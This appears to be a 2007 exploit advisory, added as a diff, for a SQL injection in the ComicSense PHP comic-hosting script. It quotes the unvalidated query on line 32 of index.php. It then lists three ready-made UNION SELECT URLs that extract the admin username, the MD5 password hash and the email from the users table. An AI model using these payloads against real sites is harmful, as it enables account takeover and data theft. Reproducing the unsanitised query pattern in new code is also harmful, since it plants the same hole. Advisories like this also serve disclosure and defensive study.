@@ -1,0 +1,33 @@
+*********************************************
+  Comicsense SQL Injection Advisory/Exploit
+*********************************************
+
+by s0cratex
+s0cratex@hotmail.com
+http://plexinium.net
+
+-
+ComicSense is a script using php / mySQL.
+It allows you to easily host an Online Comic
+or Image shack.
+You can download it from www.gayadesign.nl/comicsense/
+-
+
+The bug is a common sql injection in "index.php"
+
+Line 32:
+$sqlQuery = "SELECT * FROM " . $prefix . "comic WHERE episodenr = $epi";
+And the variable $epi is not verified...
+
+Exploit:
+--------
+Admin username
+http://site.com/comic_paht/index.php?epi=-1 UNION SELECT username,1,1 FROM users
+
+MD5 hash password:
+http://site.com/comic_paht/index.php?epi=-1 UNION SELECT password,1,1 FROM users
+
+e-Mail adress:
+http://site.com/comic_paht/index.php?epi=-1 UNION SELECT email,1,1 from users
+
+# milw0rm.com [2007-06-05]
